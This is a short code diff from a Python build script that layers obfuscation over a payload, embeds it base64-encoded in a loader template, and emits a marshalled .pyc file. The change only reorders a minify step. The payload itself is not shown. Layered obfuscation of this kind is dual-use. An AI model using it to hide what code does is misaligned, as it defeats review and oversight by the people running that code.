@@ -75,11 +75,11 @@ for i in range(5):
     payload = obfuscate(payload, inv2_layer)
 
 lolita_f = open("lolita.py", "r")
-lolita = minify(lolita_f.read())
+lolita = lolita_f.read()
 lolita_f.close()
 
 lolita = lolita.replace("__FINAL_PLACEHOLDER__", b64encode(payload))
-lolita = marshal.dumps(compile(lolita, "", "exec"))
+lolita = marshal.dumps(compile(minify(lolita), "", "exec"))
 
 lolita_f = open("lolita.final.pyc", "wb")
 
